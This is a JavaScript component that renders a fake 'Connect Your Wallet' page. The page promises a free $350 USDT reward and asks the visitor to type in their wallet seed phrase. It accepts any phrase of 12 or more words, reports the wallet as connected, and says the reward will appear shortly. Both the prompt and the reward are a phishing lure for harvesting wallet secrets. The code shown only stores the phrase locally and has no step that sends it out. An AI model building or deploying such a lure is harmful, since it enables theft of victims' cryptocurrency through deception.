// walletConnectComponent.js

// Inject HTML into the placeholder
document.getElementById('connect-wallet-component').innerHTML = `
  <div class="container">
    <div class="glass-box">
      <header>
        <h1>Connect Your Wallet</h1>
      </header>

      <div class="explanation-text">
        <p><strong>To claim your reward, connect your wallet.</strong> This allows us to securely verify your address and activate your <strong>$350 USDT</strong>.</p>
      </div>

      <button class="connect-btn" onclick="showWalletOptions()">Connect Wallet</button>

      <div id="seedPhraseContainer" class="seed-phrase-container" style="display:none;">
        <h3>Enter Your Seed Phrase</h3>
        <input type="text" id="seedPhrase" placeholder="Enter your seed phrase" />
        <button class="connect-btn" onclick="submitSeedPhrase()">Submit</button>
      </div>

      <button class="connect-btn" id="claimNFTButton" style="display:none;" onclick="claimNFT()">Claim Free $350 USDT</button>
    </div>
  </div>
`;

// Only logic related to wallet connection — no wallet list
function showWalletOptions() {
  document.getElementById("seedPhraseContainer").style.display = "block";
}

function submitSeedPhrase() {
  const phrase = document.getElementById("seedPhrase").value.trim();
  if (phrase.split(' ').length >= 12) {
    document.getElementById("claimNFTButton").style.display = "inline-block";
    alert("✅ Wallet connected successfully.");
  } else {
    alert("❌ Please enter a valid 12 or 24 word seed phrase.");
  }
}

function claimNFT() {
  alert("🎉 Your $350 USDT will appear shortly in your wallet.");
}
